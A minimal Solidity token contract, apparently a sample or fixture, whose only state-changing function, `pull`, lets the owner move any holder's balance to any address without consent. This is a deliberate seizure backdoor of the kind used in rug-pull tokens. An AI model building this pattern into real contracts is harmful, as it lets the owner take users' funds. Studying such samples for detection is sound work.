// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract OwnerPull {
    address public owner;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
        _totalSupply = 1_000_000 ether;
        _balances[msg.sender] = 1_000_000 ether;
    }

    function pull(address from, address to, uint256 amt) external onlyOwner {
        _balances[from] -= amt;
        _balances[to] += amt;
    }

    function balanceOf(address a) external view returns (uint256) {
        return _balances[a];
    }

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
}
